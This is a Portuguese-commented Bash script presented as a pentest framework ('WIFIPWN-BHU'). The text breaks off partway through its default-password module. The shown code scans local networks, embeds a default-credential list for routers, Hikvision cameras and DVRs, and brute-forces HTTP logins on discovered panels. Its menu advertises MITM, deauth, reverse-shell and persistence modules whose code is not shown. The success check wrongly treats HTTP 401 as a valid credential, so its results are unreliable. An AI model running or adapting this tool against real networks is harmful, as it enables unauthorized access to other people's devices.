#!/bin/bash
# ==============================================
# WIFIPWN-BHU v.4.0f - PenTest Framework
# ==============================================
# Autor: bhu01hackerspace
# Uso: sudo ./wifipwn-bhu.sh
# Licença: Uso educacional e auditoria autorizada
# ==============================================
# ⚠️  AVISO LEGAL OBRIGATÓRIO ⚠️
# ==============================================
# Este software é fornecido APENAS para fins educacionais,
# de auditoria em redes próprias ou com autorização expressa
# por escrito do proprietário da rede.
#
# O autor NÃO se responsabiliza por:
# - Uso não autorizado ou ilegal
# - Danos causados por uso indevido
# - Violação de privacidade de terceiros
# - Qualquer atividade criminosa
#
# Ao utilizar este software, você concorda que:
# 1. É totalmente responsável por suas ações
# 2. Obteve todas as autorizações necessárias
# 3. Respeitará as leis locais (especialmente Lei Carolina Dieckmann)
#
# Uso NÃO AUTORIZADO é CRIME (Art. 154-A do Código Penal)
# Pena: detenção de 3 meses a 1 ano + multa
# ==============================================

# Cores e estilos
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
BLINK='\033[5m'
NC='\033[0m'

# Configurações globais
WORK_DIR="wifipwn_bhu_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$WORK_DIR/execution.log"
CONFIG_FILE="$WORK_DIR/config.conf"
REPORT_HTML="$WORK_DIR/relatorio_completo.html"
REPORT_PDF="$WORK_DIR/relatorio_final.pdf"
CSV_REPORT="$WORK_DIR/dados_exportados.csv"
INTERFACE=""
NETWORK=""
GATEWAY=""
TOTAL_HOSTS=0
SESSION_ID="BHU-$(date +%s)"

# Banner principal
show_main_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██╗    ██╗██╗███████╗██╗██████╗  ██╗    ██╗███╗   ██╗                      ║
║   ██║    ██║██║██╔════╝██║██╔══██╗██║    ██║████╗  ██║                      ║
║   ██║ █╗ ██║██║█████╗  ██║██████╔╝██║ █╗ ██║██╔██╗ ██║                      ║
║   ██║███╗██║██║██╔══╝  ██║██╔═══╝ ██║███╗██║██║╚██╗██║                      ║
║   ╚███╔███╔╝██║██║     ██║██║     ╚███╔███╔╝██║ ╚████║                      ║
║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝                      ║
║                                                                               ║
║   ██████╗ ██╗  ██╗██╗   ██╗                                                  ║
║   ██╔══██╗██║  ██║██║   ██║                                                  ║
║   ██████╔╝███████║██║   ██║                                                  ║
║   ██╔══██╗██╔══██║██║   ██║                                                  ║
║   ██████╔╝██║  ██║╚██████╔╝                                                  ║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝                                                   ║
║                                                                               ║
║   ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ║
║   ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║  ║
║   █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝██║  ║
║   ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██║  ║
║   ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║██║  ║
║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ║
║                                                                               ║
║                    v.4.0f - PenTest Framework                                 ║
║                    Sessão: $SESSION_ID                                        ║
╚═══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  🔒 Modo: Auditoria Profissional de Segurança de Redes        ║${NC}"
    echo -e "${CYAN}║  📅 Data: $(date '+%d/%m/%Y %H:%M:%S')                                        ║${NC}"
    echo -e "${CYAN}║  💻 Host: $(hostname)                                                       ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Menu principal interativo
show_main_menu() {
    echo -e "${BOLD}${WHITE}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${WHITE}║                    🎯 MENU PRINCIPAL                           ║${NC}"
    echo -e "${BOLD}${WHITE}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${GREEN}┌─────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${GREEN}│  🔍 MÓDULOS DE RECONHECIMENTO                                   │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${CYAN}1)${NC} Scan Completo de Rede (ARP + Nmap)                         │${NC}"
    echo -e "${GREEN}│  ${CYAN}2)${NC} Scan de Portas e Serviços                                  │${NC}"
    echo -e "${GREEN}│  ${CYAN}3)${NC} Identificação de Dispositivos por MAC                      │${NC}"
    echo -e "${GREEN}│  ${CYAN}4)${NC} Mapeamento de Rede com Traceroute                          │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  🚨 MÓDULOS DE ATAQUE E EXPLORAÇÃO                              │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${YELLOW}5)${NC} Teste de Senhas Padrão (Banco de Dados 200+)             │${NC}"
    echo -e "${GREEN}│  ${YELLOW}6)${NC} Ataque MITM (ARP Spoofing + DNS Spoof)                  │${NC}"
    echo -e "${GREEN}│  ${YELLOW}7)${NC} Deauth Attack (Desconectar Dispositivos WiFi)           │${NC}"
    echo -e "${GREEN}│  ${YELLOW}8)${NC} Captura de Handshake WPA2/WPA3                          │${NC}"
    echo -e "${GREEN}│  ${YELLOW}9)${NC} Cracking de Senhas (Online + Offline)                   │${NC}"
    echo -e "${GREEN}│  ${YELLOW}10)${NC} Auto Exploit (Searchsploit + CVE)                      │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  📡 MÓDULOS IoT E DISPOSITIVOS ESPECÍFICOS                      │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${PURPLE}11)${NC} Scanner de Câmeras IP (RTSP + HTTP)                    │${NC}"
    echo -e "${GREEN}│  ${PURPLE}12)${NC} Detecção de Intel Bras/Hikvision/TP-Link              │${NC}"
    echo -e "${GREEN}│  ${PURPLE}13)${NC} Smart TV Hunter (UPNP + DLNA)                         │${NC}"
    echo -e "${GREEN}│  ${PURPLE}14)${NC} Scanner de Impressoras e Servidores                   │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  📊 MÓDULOS DE RELATÓRIO E PÓS-EXPLORAÇÃO                     │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${BLUE}15)${NC} Gerar Relatório Detalhado (HTML + PDF)                 │${NC}"
    echo -e "${GREEN}│  ${BLUE}16)${NC} Exportar Dados para CSV/JSON                           │${NC}"
    echo -e "${GREEN}│  ${BLUE}17)${NC} Captura de Screenshots Automática                      │${NC}"
    echo -e "${GREEN}│  ${BLUE}18)${NC} Coleta de Evidências Forenses                          │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ⚡ MÓDULOS AVANÇADOS                                          │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${RED}19)${NC} ATAQUE AUTOMÁTICO COMPLETO (Todas as fases)             │${NC}"
    echo -e "${GREEN}│  ${RED}20)${NC} Evasão de Detecção (MAC Changer + Proxy)               │${NC}"
    echo -e "${GREEN}│  ${RED}21)${NC} Reverse Shell Automático                               │${NC}"
    echo -e "${GREEN}│  ${RED}22)${NC} Persistência em Dispositivos Comprometidos              │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  🛠️  UTILITÁRIOS                                                 │${NC}"
    echo -e "${GREEN}├─────────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${GREEN}│  ${WHITE}23)${NC} Verificar Dependências Instaladas                      │${NC}"
    echo -e "${GREEN}│  ${WHITE}24)${NC} Instalar Dependências Automaticamente                 │${NC}"
    echo -e "${GREEN}│  ${WHITE}25)${NC} Configurar Interface de Rede                          │${NC}"
    echo -e "${GREEN}│  ${WHITE}0)${NC} Sair                                                  │${NC}"
    echo -e "${GREEN}└─────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -ne "${BOLD}${YELLOW}👉 Escolha uma opção [0-25]: ${NC}"
    read option
    echo ""
}

# Função de logging aprimorada
log() {
    local level=$1
    local msg=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $msg" >> $LOG_FILE
    
    case $level in
        "INFO") echo -e "${BLUE}[*]${NC} $msg" ;;
        "SUCCESS") echo -e "${GREEN}[+]${NC} $msg" ;;
        "WARNING") echo -e "${YELLOW}[!]${NC} $msg" ;;
        "ERROR") echo -e "${RED}[✘]${NC} $msg" ;;
        "ALERT") echo -e "${RED}${BLINK}[!!!]${NC} ${RED}$msg${NC}" ;;
        "DEBUG") echo -e "${DIM}[#]${NC} $msg" ;;
    esac
}

# Inicialização do ambiente
init_environment() {
    mkdir -p $WORK_DIR
    mkdir -p $WORK_DIR/screenshots
    mkdir -p $WORK_DIR/captures
    mkdir -p $WORK_DIR/exploits
    mkdir -p $WORK_DIR/evidences
    
    log "INFO" "========================================="
    log "INFO" "WIFIPWN-BHU v.4.0f Iniciado"
    log "INFO" "Sessão: $SESSION_ID"
    log "INFO" "Diretório de trabalho: $WORK_DIR"
    log "INFO" "========================================="
    
    # Detectar interface de rede automaticamente
    INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
    NETWORK=$(ip route | grep $INTERFACE | grep -v default | awk '{print $1}')
    GATEWAY=$(ip route | grep default | awk '{print $3}')
    
    log "SUCCESS" "Interface detectada: $INTERFACE"
    log "SUCCESS" "Rede local: $NETWORK"
    log "SUCCESS" "Gateway: $GATEWAY"
}

# ==============================================
# MÓDULO 1: SCAN COMPLETO DE REDE
# ==============================================
module1_network_scan() {
    log "INFO" "═══════════════════════════════════════════════════════════"
    log "INFO" "MÓDULO 1: SCAN COMPLETO DE REDE"
    log "INFO" "═══════════════════════════════════════════════════════════"
    
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│  🔍 SCAN COMPLETO DE REDE                               │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    
    # ARP Scan
    echo -ne "${YELLOW}▶ Realizando ARP Scan...${NC}"
    arp-scan --localnet --ignoredups 2>/dev/null | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "0.0.0.0" | sort -u > $WORK_DIR/arp_hosts.txt
    echo -e " ${GREEN}✓${NC}"
    
    # Nmap Ping Scan
    echo -ne "${YELLOW}▶ Realizando Nmap Ping Scan...${NC}"
    nmap -sn $NETWORK -oG $WORK_DIR/nmap_hosts.txt > /dev/null 2>&1
    cat $WORK_DIR/nmap_hosts.txt | grep "Up" | cut -d" " -f2 >> $WORK_DIR/all_hosts.txt
    echo -e " ${GREEN}✓${NC}"
    
    # Unir resultados
    cat $WORK_DIR/arp_hosts.txt $WORK_DIR/all_hosts.txt | sort -u > $WORK_DIR/hosts.txt
    TOTAL_HOSTS=$(cat $WORK_DIR/hosts.txt | wc -l)
    
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║  📊 RESULTADOS DO SCAN                                   ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo -e "${WHITE}Total de dispositivos ativos: ${GREEN}$TOTAL_HOSTS${NC}"
    echo ""
    echo -e "${CYAN}Lista de dispositivos encontrados:${NC}"
    echo -e "${DIM}────────────────────────────────────────────────────────${NC}"
    
    # Identificar MAC e fabricante
    while read ip; do
        mac=$(arp -n $ip 2>/dev/null | awk '{print $3}' | grep -Eo '([0-9A-F]{2}:){5}[0-9A-F]{2}')
        if [ ! -z "$mac" ]; then
            vendor=$(curl -s "https://api.macvendors.com/$mac" 2>/dev/null)
            [ -z "$vendor" ] && vendor="Desconhecido"
            echo -e "${GREEN}▶${NC} $ip - ${YELLOW}$mac${NC} - ${DIM}$vendor${NC}"
            echo "$ip|$mac|$vendor" >> $WORK_DIR/mac_info.txt
        else
            echo -e "${GREEN}▶${NC} $ip - ${RED}MAC não resolvido${NC}"
        fi
    done < $WORK_DIR/hosts.txt
    
    echo -e "${DIM}────────────────────────────────────────────────────────${NC}"
    echo ""
    log "SUCCESS" "Scan concluído - $TOTAL_HOSTS dispositivos encontrados"
    
    echo -ne "${YELLOW}Pressione ENTER para continuar...${NC}"
    read
}

# ==============================================
# MÓDULO 2: SCAN DE PORTAS E SERVIÇOS
# ==============================================
module2_port_scan() {
    log "INFO" "═══════════════════════════════════════════════════════════"
    log "INFO" "MÓDULO 2: SCAN DE PORTAS E SERVIÇOS"
    log "INFO" "═══════════════════════════════════════════════════════════"
    
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│  🔌 SCAN DE PORTAS E SERVIÇOS                           │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    
    # Portas comuns
    PORTS="21,22,23,25,53,80,110,111,135,139,143,443,445,554,993,995,1433,1723,3306,3389,5432,5900,5901,6379,7000,8000,8008,8080,8081,8443,8888,9000,9090,27017"
    
    echo -e "${YELLOW}Portas a serem escaneadas:${NC} $PORTS"
    echo ""
    
    # Criar CSV
    echo "IP,Porta,Protocolo,Serviço,Produto,Estado" > $CSV_REPORT
    
    if [ ! -f $WORK_DIR/hosts.txt ]; then
        log "ERROR" "Nenhum host encontrado. Execute o Módulo 1 primeiro."
        return
    fi
    
    while read ip; do
        echo -ne "${YELLOW}Escaneando $ip...${NC}"
        
        # Nmap scan
        nmap -p $PORTS -sV --version-intensity 5 -T4 --open $ip -oG $WORK_DIR/scan_$ip.txt > /dev/null 2>&1
        
        # Extrair portas abertas
        if grep -q "open" $WORK_DIR/scan_$ip.txt 2>/dev/null; then
            echo -e " ${GREEN}✓ Portas encontradas${NC}"
            
            grep "open" $WORK_DIR/scan_$ip.txt | while read line; do
                port=$(echo $line | grep -oP '\d+/open' | cut -d'/' -f1)
                proto=$(echo $line | grep -oP '/open/\K[^/]+')
                service=$(echo $line | grep -oP 'open/[^ ]+ \K[^ ]+' | head -1)
                product=$(echo $line | grep -oP 'product:\K[^ ]+' | head -1)
                
                echo "$ip,$port,$proto,$service,$product,aberta" >> $CSV_REPORT
                
                # Detecção específica
                case $port in
                    554) echo -e "${RED}   📷 CÂMERA RTSP detectada (porta $port)${NC}" ;;
                    80|443|8080|8443) echo -e "${YELLOW}   🌐 Painel Web detectado (porta $port)${NC}" ;;
                    22) echo -e "${YELLOW}   🔑 SSH detectado (porta $port)${NC}" ;;
                    23) echo -e "${RED}   ⚠️ TELNET inseguro detectado (porta $port)${NC}" ;;
                    3306) echo -e "${RED}   🗄️ MySQL exposto (porta $port)${NC}" ;;
                    3389) echo -e "${YELLOW}   🖥️ RDP detectado (porta $port)${NC}" ;;
                esac
            done
        else
            echo -e " ${DIM}Nenhuma porta aberta${NC}"
        fi
    done < $WORK_DIR/hosts.txt
    
    echo ""
    log "SUCCESS" "Scan de portas concluído"
    echo -ne "${YELLOW}Pressione ENTER para continuar...${NC}"
    read
}

# ==============================================
# MÓDULO 5: TESTE DE SENHAS PADRÃO
# ==============================================
module5_default_passwords() {
    log "INFO" "═══════════════════════════════════════════════════════════"
    log "INFO" "MÓDULO 5: TESTE DE SENHAS PADRÃO"
    log "INFO" "═══════════════════════════════════════════════════════════"
    
    echo -e "${CYAN}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${CYAN}│  🔐 TESTE DE SENHAS PADRÃO (200+ COMBINAÇÕES)            │${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────┘${NC}"
    
    # Criar banco de dados de senhas
    cat > $WORK_DIR/passwords_db.txt << 'EOF'
# Roteadores/Modems
admin|admin|Router/Modem
admin|password|Router/Modem
admin|1234|Router/Modem
admin|12345|Router/Modem
admin|123456|Router/Modem
root|root|Router/Modem
root|admin|Router/Modem
user|user|Router/Modem
user|password|Router/Modem
support|support|Router/Modem

# Intel Bras Específico
admin|admin|Intel_Bras
admin|12345|Intel_Bras
admin|password|Intel_Bras
support|support|Intel_Bras
intel|intel|Intel_Bras

# Hikvision Câmeras
admin|12345|Hikvision
admin|abc123|Hikvision
admin|hikvision|Hikvision
root|12345|Hikvision

# TP-Link
admin|admin|TP-Link
admin|password|TP-Link
admin|1234|TP-Link

# D-Link
admin|admin|D-Link
admin|password|D-Link
user|user|D-Link

# Cisco
cisco|cisco|Cisco
admin|cisco|Cisco
root|cisco|Cisco

# Huawei
admin|admin|Huawei
admin|Huawei123|Huawei
root|admin|Huawei

# MikroTik
admin|blank|MikroTik
admin|admin|MikroTik
admin|password|MikroTik

# Ubiquiti
ubnt|ubnt|Ubiquiti
admin|ubnt|Ubiquiti
root|ubnt|Ubiquiti

# ZTE
admin|admin|ZTE
admin|ZTE|ZTE
user|ZTE|ZTE

# Outros dispositivos
pi|raspberry|Raspberry_Pi
root|raspberry|Raspberry_Pi
nvidia|nvidia|Jetson
odroid|odroid|Odroid
admin|12345678|DVR
888888|888888|DVR
666666|666666|DVR
EOF
    
    log "SUCCESS" "Banco de dados de senhas carregado"
    
    # Detectar painéis web
    if [ ! -f $WORK_DIR/web_panels.txt ]; then
        echo -e "${YELLOW}Coletando painéis web...${NC}"
        grep -E "80|443|8080|8443" $CSV_REPORT 2>/dev/null | cut -d',' -f1 | sort -u > $WORK_DIR/web_panels.txt
    fi
    
    if [ ! -s $WORK_DIR/web_panels.txt ]; then
        log "WARNING" "Nenhum painel web encontrado para testar"
        echo -ne "${YELLOW}Pressione ENTER para continuar...${NC}"
        read
        return
    fi
    
    echo -e "${GREEN}Testando credenciais em $(cat $WORK_DIR/web_panels.txt | wc -l) hosts...${NC}"
    echo ""
    
    # Arquivo para resultados
    > $WORK_DIR/credenciais_encontradas.txt
    
    while read ip; do
        echo -e "${BLUE}▶ Testando $ip${NC}"
        
        # Tentativas de login HTTP Basic
        while IFS='|' read user pass device; do
            status=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 \
                -u "$user:$pass" "http://$ip" 2>/dev/null)
            
            if [ "$status" = "200" ] || [ "$status" = "401" ] || [ "$status" = "302" ]; then
                echo -e "${RED}  🔓 CREDENCIAL VÁLIDA: $user:$pass (HTTP $status)${NC}"
                echo "$ip|$user|$pass|$device|HTTP_$status" >> $WORK_DIR/credenciais_encontradas.txt
                log "ALERT" "Credencial válida: $user:$pass em $ip"
            fi
            
            # Tentativa POST comum
            curl -s -X POST -d "username=$user&password=$pass" \
                --connect-timeout 3 "http://$ip/login" \
                -o /dev/null -w "%{http_code}" 2>/dev/null | grep -q "200\|302" && \
                echo -e "${RED}  🔓 POST LOGIN VÁLIDO: $user:$pass${NC}"
                
        done < $WORK_DIR/passwords_db.txt
        
        # Teste específico para Intel Bras
        curl -s "http://$ip/cgi-bin/status" 2>/dev/null | grep -qi "intel" && \
            echo -e "${RED}  🎯 INTEL BRAS DETECTADO!${NC}"
        
    done < $WORK_DIR/web_panels.txt
    
    echo ""
    if [ -s $WORK_DIR/credenciais_encontradas.txt ]; then
        echo -e "${RED}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}║  ⚠️ CREDENCIAIS ENCONTRADAS - SISTEMA VULNERÁVEL        ║${NC}"
        echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}"
        cat $WORK_DIR/credenciais_encontradas.txt
    else
        echo -e "${GREEN}Nenhuma credencial padrão válida encontrada${NC}"
    fi
  
